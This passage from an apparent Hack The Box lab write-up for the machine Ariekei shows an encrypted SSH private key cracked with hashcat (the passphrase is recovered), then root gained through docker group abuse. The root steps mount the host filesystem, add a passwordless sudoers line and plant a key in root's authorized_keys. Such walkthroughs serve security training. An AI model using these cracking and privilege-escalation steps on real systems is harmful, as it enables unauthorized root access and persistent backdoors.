And `authorized_keys` contains the public key:

```

root@beehive:/home/spanishdancer/.ssh# diff authorized_keys id_rsa.pub

```

That public key belongs to `spanishdancer@ariekei.htb`.

### Crack Private Key

The private key is encrypted:

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,C3EBD8120354A75E12588B11180E96D5

2UIvlsa0jCjxKXmQ4vVX6Ez0ak+6r5VuZFFoalVXvbZSLomIya4vYETv1Oq8EPeh
KHjq5wFdlYdOXqyJus7vFtB9nbCUrgH/a3og0/6e8TA46FuP1/sFMV67cdTlXfYI
...[snip]...
1oSM+qvLUNfJKlvqdRQr50S1OjV+9WrmR0uEBNiNxt2PNZzY/Iv+p8uyU1+hOWcz
-----END RSA PRIVATE KEY-----

```

First, I’ll convert it to a hash with `ssh2john`:

```

oxdf@hacky$ ssh2john.py spanishdancer.key >spanishdancer.hash

```

Now I’ll fire up `hashcat`, which recognizes it as mode 22931 and cracks it instantly:

```

$ /opt/hashcat-6.2.5/hashcat.bin spanishdancer.hash /usr/share/wordlists/rockyou.txt --user
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

22931 | RSA/DSA/EC/OpenSSH Private Keys ($1, $3$) | Private Key
...[snip]...
$sshng$1$16$c3ebd8120354a75e12588b11180e96d5$1200$d9422f96c6b48c28f1297990e2f557e84cf46a4fbaaf956e6451686a5557bdb6522e8988c9ae2f6044efd4eabc10f7a12878eae7015d95874e5eac89baceef16d07d9db094ae01ff6b7a20d3fe9ef13038e85b8fd7fb05315ebb71d4e55df608638b0657f3d2fee2e6ebfb5c12998689575c5091e9304099be7c7d6926bf92fb8ee6935f745be743845503cabfc3abcda77a4323d0b3767918987e7ffbf41816cbcc938b751c1e4028ee6646b735c7e419061b540cd540682bb69a765a49484469b668d283191c6f2c113049790467a203f2023c26015172e5c0d32e06a0f4794585becc2e0ab476037ecad89df5803ca6a4edc7c33df110e154aa9c546de4cd115cfe524114a6bb61a6d305a0e85abc91d3eeb1fb2c296811ac517128cfa85452f2d61f5df8c3c3c6b91fd18daeb8b346688c662c9c7225d393c89edbe5f618a70cd73463d40e98a75ef75359169723a4394da0848273738d9cbe1cef1812e43da83b1fb7976329c41f81f6e6bf50d27071c0dd254ca82449d1b79f5d1f5837717bdbff34c4925c06fd92de777856530fdfef50fd0d957e7274a56fd1015875ef489c2a4f5c9cb2f25165349165e385061f5ab96a801e4d9267ad647173a9f96f753b65a59e2d8c09e6232eec3aacb50751c12752ad330fdc7a99134ba73a77202f151665b4dc446179533a2259ebf0739c3909cf1e060ce624ccefd5fbd24096a226c0083b841f3fe77fab6e2c66ef374d4272d7d213e260a0d20875be121f14ed6cebd4b6c6b242657cbaacc7a4243714c7f3eae46f978655bcd208ff1f03bbe8513ed435ebdd0483db16aaed14a3ceffbfa73f5c98ad358cc350e99a8afa08a4bd113ba9aef408577019ea06ede1a0f4a07a38bd53b4090fae13f089ef07b31c85f6896fd5bf553102493dc5cc014f8427bae9947344a65280cc1fb538b9866d7bc0f06e2e3a2f38233c416a758b7d8881c76b9d99f6a41a6df78bfcfca330750c8038e561928cc1352e97cdae0fd7cc945f75225043fd726b73edb4d13f98794a50f3869ae7b5a291885107579492f7812b8bb4f2970e0a065905f25483599989bc041ce0537e9a16dac5a80269d09fd76f9554dac1dfebc92a850781a457f91e0ff07dce4cac2e6f57baf6f9e74210a13c7987f52ac8d9336c3fd34f4f981eb937b45cf3f73a0dd35737a71bb0d1af1e0081efb44eb31285c31e250f03b379008aa1ece65886a931bdea2d477aa90f9acf5d4c2f3de4a7b48ef2059108313d207acbba0a8bb546b35e6fb356aef53eb1c012c9412a8c94f7b0bd452dbcc40074dbb97a4b2ea6ea81322251510bc6f610f48e35f3f1fe5c08276dbbc34df06bb88dc645995bec6d108ff2b40129ea9cfeba9ed1b842b6fb8c86797baedcae230db3000aaa96e16cf332fa62b3b09412cb673a34bc87c65d5e363413e0489b5cf573376124e36dd024fb204d20af461154db90ef4670c815681839c6dfbab861397599adcae1b20fa963d652a4f03ecf6c21d305cf4c32bc8a6279d6b7b0aec450d5fc9a787c1fbf0ee3d82fd610f11add2294a140a875f3d968ddd73a274d0b982514e6a10f2da33e006161a64f7dd35d2bad907f107c66708d113a1e53d6848cfaabcb50d7c92a5bea75142be744b53a357ef56ae6474b8404d88dc6dd8f359cd8fc8bfea7cbb2535fa1396733:purple1
...[snip]...

```

The password is “purple1”.

### SSH

`openssl` can create a copy of the key that isn’t encrypted:

```

oxdf@hacky$ openssl rsa -in spanishdancer.key -out ~/keys/ariekei-spanishdancer
Enter pass phrase for spanishdancer.key:
writing RSA key

```

That works to connect to the host machine as spanishdancer:

```

oxdf@hacky$ chmod 600 ~/keys/ariekei-spanishdancer 
oxdf@hacky$ ssh -i ~/keys/ariekei-spanishdancer spanishdancer@10.10.10.65
Warning: Permanently added '10.10.10.65' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-87-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.

Last login: Mon Nov 13 10:23:41 2017 from 10.10.14.2
spanishdancer@ariekei:~$

```

## Shell as root on Ariekei

### Enumeration

spanishdancer is in the `docker` group:

```

spanishdancer@ariekei:~$ id
uid=1000(spanishdancer) gid=1000(spanishdancer) groups=1000(spanishdancer),999(docker)

```

This allows the user to do things like list running containers:

```

spanishdancer@ariekei:~$ docker ps
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                          NAMES
c362989563fd        convert-template    "/bin/sh -c 'pytho..."   4 years ago         Up 7 hours          8080/tcp                       convert-live
7786500c3e80        bastion-template    "/usr/sbin/sshd -D"      4 years ago         Up 7 hours          0.0.0.0:1022->22/tcp           bastion-live
e980d631b20e        waf-template        "/bin/sh -c 'nginx..."   4 years ago         Up 7 hours          80/tcp, 0.0.0.0:443->443/tcp   waf-live
d77fe9521405        web-template        "/usr/sbin/apache2..."   4 years ago         Up 7 hours          80/tcp                         blog-test
f09d48cdcc74        bastion-template    "/bin/bash"              4 years ago         Up 7 hours          22/tcp                         youthful_elion
eaf0202889f6        web-template        "/bin/bash"              4 years ago         Up 7 hours          80/tcp                         gifted_elion

```

And list images:

```

spanishdancer@ariekei:~$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
waf-template        latest              399c8876e9ae        4 years ago         628MB
bastion-template    latest              0df894ef4624        4 years ago         251MB
web-template        latest              b2a8f8d3ef38        4 years ago         185MB
bash                latest              a66dc6cea720        4 years ago         12.8MB
convert-template    latest              e74161aded79        5 years ago         418MB

```

It also allows the user to start and stop containers, and get a shell inside them.

### Filesystem Access

[This 2015 post from Chris Foster](https://fosterelli.co/privilege-escalation-via-docker) goes over why isn’t not safe to give a user access to the `docker` group. The basic attack is to start a container with the entire host file system mapped into the container, and then drop into that container as root and have full read/write.

I could work from any of the images above, but it seems like `bash` is a reasonable target here. I’ll use `-v [host path]:[container path]` to mount the file system:

```

spanishdancer@ariekei:~$ docker run -v /:/mnt -it bash bash
bash-4.4#

```

It’s dropped me into a `bash` shell inside the container, and I can access the host file system in `/mnt`:

```

bash-4.4# ls /mnt/
bin         dev         home        lib         lost+found  mnt         proc        run         snap        sys         usr         vmlinuz
boot        etc         initrd.img  lib64       media       opt         root        sbin        srv         tmp         var

```

I can read `root.txt` now:

```

bash-4.4# cat /mnt/root/root.txt
4b2d10a8************************

```

### Shell

#### Via sudoers

From within the shell, I’ll edit `/mnt/etc/sudoers` and add a line so that spanishdancer can run any command with `sudo` as root without a password. The file is actually read only, so I’ll update the permissions to allow root to write:

```

bash-4.4# ls -l /mnt/etc/sudoers
-r--r-----    1 root     root           755 Jul  4  2017 /mnt/etc/sudoers

```

Now I’ll open it in `vi` (the only text editor in the container) and add the following line:

```

spanishdancer   ALL=(ALL) NOPASSWD: ALL

```

After saving and exiting, I’ll change the permissions back:

```

bash-4.4# chmod 440 /mnt/etc/sudoers

```

I’ll exit the container, and run `sudo -l` to list the current user’s `sudo` privileges:

```

bash-4.4# exit
spanishdancer@ariekei:~$ sudo -l
sudo: unable to resolve host ariekei.htb: Connection refused
Matching Defaults entries for spanishdancer on ariekei:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User spanishdancer may run the following commands on ariekei:
    (ALL) NOPASSWD: ALL

```

Seeing it worked, I’ll get a shell:

```

spanishdancer@ariekei:~$ sudo su -
sudo: unable to resolve host ariekei.htb: Connection refused
root@ariekei:~#

```

#### Via SSH Key

I can also drop my SSH key into root’s `authorized_keys` file and then connect with SSH.

From within the container, I’ll have to create the `.ssh` directory in `/root`:

```

bash-4.4# cd /mnt/root/
bash-4.4# mkdir .ssh

```

Now I’ll drop my public key into it:

```

bash-4.4# echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" > .ssh/authorized_keys

```

Back on my VM, I can SSH as root into Ariekei:

```

oxdf@hacky$ ssh -i ~/keys/ed25519_gen root@10.10.10.65
Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-87-generic x86_64)
 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

7 packages can be updated.
7 updates are security updates.

Last login: Thu Sep  2 07:55:28 2021
root@ariekei:~# 

```